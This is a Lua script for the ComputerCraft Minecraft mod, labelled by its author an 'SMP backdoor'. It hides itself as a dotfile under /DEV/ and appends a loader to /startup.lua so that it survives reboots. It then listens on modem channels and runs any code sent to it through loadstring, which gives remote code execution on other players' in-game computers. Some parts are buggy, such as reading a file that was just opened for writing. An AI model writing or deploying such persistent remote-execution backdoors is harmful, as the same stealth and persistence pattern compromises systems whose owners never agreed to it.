-- computer craft SMP backdoor!
local pwd = shell.getRunningProgram();

local backdoorStartup = [[-- DO NOT TOUCH - BACKDOOR.EXE --
_ENV.string.split = function(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
        table.insert(t, str)
    end
    return t
end

local FileList = fs.list("/DEV/") --Table with all the files and directories available

for _, file in ipairs(FileList) do --Loop. Underscore because we don't use the key, ipairs so it's in order
    local tbl = string.split(file, ".");
    if tbl[#tbl] == "lua" then
        shell.run("/DEV/" .. file);
    end
end --End the loop
-- DO NOT TOUCH - BACKDOOR.EXE --]]

_ENV.string.split = function(inputstr, sep)
    if sep == nil then
       sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
       table.insert(t, str)
    end
    return t
 end

if not fs.exists("/DEV/.backdoor.lua") then
    --[[
    local _self = fs.open(pwd, "r");
    local file = fs.open("/rom/autorun/backdoor.lua", "w");

    file.write(_self.readAll());

    _self.close();
    file.close();

    fs.delete(pwd); -- Hopefully deletes the script
    --]]
    local startupFile = fs.open("/startup.lua", "w");
    local contents = "";
    if startupFile.readAll ~= nil then
        contents = startupFile.readAll();
    end

    if #string.split(contents, "-- DO NOT TOUCH - BACKDOOR.EXE --") > 0 then
    
    end
    if contents ~= "" then contents = contents.."\n" end;
    startupFile.write(contents..backdoorStartup)
    startupFile.close()
    shell.run("move " .. pwd .. " /DEV/.backdoor.lua")

    os.reboot();
else
    if pwd ~= "DEV/.backdoor.lua" then
        shell.run("rm /DEV/.backdoor.lua");
        shell.run("move " .. pwd .. " /DEV/.backdoor.lua");
        os.reboot();
    end
end

if not fs.exists("/startup.lua") then
    local startupFile = fs.open("/startup.lua", "w");
    local contents = "";
    if startupFile.readAll ~= nil then
        contents = startupFile.readAll();
    end

    if contents ~= "" then contents = contents.."\n" end;
    startupFile.write(contents..backdoorStartup)
    startupFile.close()

    os.reboot();
end

-- This is how I make the backdoor auto run

function shutdown(msg)
    print(msg)
    os.shutdown()
end

local id = os.getComputerID();
local port = 1489;
local backdoorPort = port+id;
local modem = peripheral.find("modem") or shutdown("A modem is required");

modem.open(port); -- This is so the server can request the id
modem.open(backdoorPort);

modem.transmit(port, backdoorPort, id)

function Check(event, side, channel, replyChannel, message, distance)
    print(event, side, channel, replyChannel, message, distance)
    if channel == backdoorPort then
        modem.transmit(port, backdoorPort, "Code Sent!")
        local s, e = pcall(function()
---@diagnostic disable-next-line: deprecated
            local code = loadstring(message);
            if type(code) == "function" then
                code()
            end
        end)
        if not s then
            modem.transmit(port, backdoorPort, e)
        end
    elseif channel == port and message == "get" then
        modem.transmit(port, backdoorPort, id)
    end
end

function Loop()
    parallel.waitForAny(
        function()
            local event, side, channel, replyChannel, message, distance = os.pullEventRaw("modem_message");
            Check(event, side, channel, replyChannel, message, distance)
        end,
        function()
            local myTimer = os.startTimer(30)

            while true do
                local myEvent = {os.pullEvent()}

                if myEvent[1] == "timer" and myEvent[2] == myTimer then
                    break
                elseif myEvent[1] == "char" then
                    os.pullEvent("yield forever")
                end
            end
        end
    );
    Loop();
end
Loop();